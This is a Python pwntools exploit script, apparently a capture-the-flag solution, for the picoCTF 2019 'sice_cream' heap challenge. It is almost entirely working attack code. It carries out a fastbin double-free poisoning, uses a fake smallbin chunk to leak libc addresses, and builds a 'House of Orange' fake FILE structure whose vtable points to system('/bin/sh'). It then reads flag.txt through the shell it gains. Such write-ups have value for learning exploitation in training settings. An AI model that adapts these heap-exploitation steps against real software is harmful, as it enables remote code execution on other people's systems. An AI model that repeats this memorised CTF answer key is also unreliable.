#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2019shell1.picoctf.com --port 3972 sice_cream
from pwn import *
import time
import re

# Set up pwntools for the correct architecture
# ELF tutorial: https://github.com/Gallopsled/pwntools-tutorial/blob/master/elf.md
exe = context.binary = ELF('sice_cream')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2019shell1.picoctf.com'
port = int(args.PORT or 3972)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Standard helper functions
def wait():
	time.sleep(0.05)
def flush():
	return io.recv(4096)

def buy(name, amt):
	io.sendline("1")
	io.sendlineafter("How much sice cream do you want?", str(amt))
	io.sendlineafter("What flavor?", name)
	io.recvuntil("4. Exit")
	wait()

def eat(n):
	io.sendline("2")
	io.sendlineafter("Which sice cream do you want to eat?", str(n))
	io.recvuntil("4. Exit\n")
	wait()

def rename(s):
	io.sendline("3")
	io.sendlineafter("What's your name again?", s)
	wait()
	return flush()

# Converts a string containing memory into a packed exploit string
def str2payload(s):
	s = s.replace("\n"," ")
	s = s.replace("\t"," ")
	# We ignore chunks ending with ":" for convenience
	mem = [x for x in s.split(" ") if x is not "" and not x[-1] == ":"]
	nums = [int(x,16) for x in mem]
	return ''.join([p64(x) for x in nums])

# Secret function that prints out the contents of a file given by its argument.
PRINT_FILE = 0x400cc4

# Begin exploit
io = start()

io.sendline("name")
wait()

# Our first job is to get a libc leak. We will accomplish this by writing a fake
# fastbin chunk into name and freeing it.
m1 = """
0x602040:    0x0000000000000000    0x00000000000000c1
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000000000
0x6020c0:    0x0000000000000000    0x0000000000000000
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0:    0x0000000000000000    0x0000000000000000
0x6020f0:    0x0000000000000000    0x0000000000000000
0x602100:    0x00000000000000c1    0x0000000000000031
0x602110:    0x0000000000000000    0x0000000000000000
0x602120:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000041
"""
# The last char is removed because it will become `\n`
payload1 = str2payload(m1)[:-1]


# Because creams is directly below name in memory, we use double free fastbin
# poisoning to get the chunk at RETME, which we can use to write SMALLBIN to
# creams[0].
RETME = 0x602130
SMALLBIN = 0x602050
SZ = 56

# Standard double free to coerce malloc to return RETME
buy("", SZ)
# We also need to leak a heap address, and we can do that right after our
# first malloc. By filling name with non-NULL bytes we get rename to leak
# creams[0] and thus calculate HEAPBASE.
flush()
rename("A" * (0x100-1))
data = flush()

temp = data.split('\n')[1][:-1]
HEAPBASE = u64(temp.ljust(8, '\x00')) - 0x10
log.info("Leaked heapbase: {0}".format(hex(HEAPBASE)))

if HEAPBASE <= 0:
	log.error("Heapbase is 0x00, please re-run the script.")

# Put the contents of m1 into name, including our smallbin chunk and the chunk
# above as well as a chunk in between to pass the corruption checks.
rename(payload1)

# Continue the double free
buy("", SZ)
buy("", SZ)
eat(0)
eat(1)
eat(0)
# Poison the fastbin fd pointer
buy(p64(RETME),SZ)
buy("",SZ)
# (We will use this chunk (at HEAPBASE + 0x10) later)
buy(p64(PRINT_FILE)*5,SZ)
# This malloc will now give us the chunk at RETME, so we can write the address
# of our smallbin chunk into creams[0].
buy(p64(SMALLBIN),SZ)

# Free the fake smallbin chunk
eat(0)

# Leak libc with rename. We fill the first 16 bytes with non-NULL because the
# libc address begins at byte 17
flush()
rename("AAAABBBBCCCCDDD")
data = flush()

# Calculate critical offsets
temp = data.split('\n')[1][:-1]
LEAKED = u64(temp.ljust(8, '\x00'))
LIBC_BASE = LEAKED - 0x3C4B78 #0x3a4438
IOLISTALL = LIBC_BASE + libc.symbols['_IO_list_all'] #0x3a4de0
IO_STDIN_CHAIN = LIBC_BASE + 0x3c4948
SYSTEM = LIBC_BASE + libc.symbols['system'] #0x45390
log.info("Leaked libc: {0}".format(hex(LIBC_BASE)))
log.info("_IO_list_all: {0}".format(hex(IOLISTALL)))
log.info("system: {0}".format(hex(SYSTEM)))

# Setup "House of Orange" exploit.
# next line contains: 4 bytes of pervious chunk (our call to system) + size of fake chunk
payload = '/bin/sh\x00' + p64(0x61)
# next line contains: forward pointer + backwards pointer (gets overwritten with the address of the unsorted-bin-list)
payload += p64(0xdeadbeef) + p64(IOLISTALL-0x10)
# Next line sets `write_base` to 2 and `write_ptr` to 3: fp->_IO_write_ptr > fp->_IO_write_base
# This is required to make our chunk appear like a `struct FILE`
payload += p64(2) + p64(3)
# Next line fills the inside of the chunk with the address of system (to be used later as fake vtable)
payload += p64(SYSTEM)*18
# ensure `fp->_mode = 0;` in our fake FILE chunk. Offset from top of chunk of `_mode` is `0xc0`
payload += p64(0) + p64(0)
# next line: ensure `fp->_mode = 0;` + address of fake vtable
# our fake vtable is located within the chunk and is filled with pointers to system
# we could have places the fake vtable anywhere (https://1ce0ear.github.io/2017/11/26/study-house-of-orange/
# places it directly after the block) as long as we knew its address
payload += p64(0) + p64(0x602040 + 0x60)

# buf = "/bin/sh\x00" + p64(0x61) + p64(0) + p64(IOLISTALL-0x10)
# buf = buf.ljust(255, "\x00")
# buf = buf[:0x20] + p64(2) + p64(3) + buf[0x30:]
# buf = buf[:0x70] + p64(SYSTEM)*6 + buf[0xa8:]
# buf = buf[:0xd8] + p64(0x602040 + 0x60) + buf[0xe0:]
# payload = buf

log.info("payload:\n{}".format(hexdump(payload)))
rename(payload)

# select "buy" option
io.sendline("1")
# request a block of size 40, which executes `system("/bin/sh")`
io.sendlineafter("How much sice cream do you want?", "40")
wait()
# now that we have a shell, simply print `flag.txt`
io.sendline("cat flag.txt")
# store the output until the end of the flag
output = io.recvuntil("}")
# search for the flag in the output
flag = re.search("flag{.*?}", output.decode("ascii")).group()
# log the flag
log.success(flag)
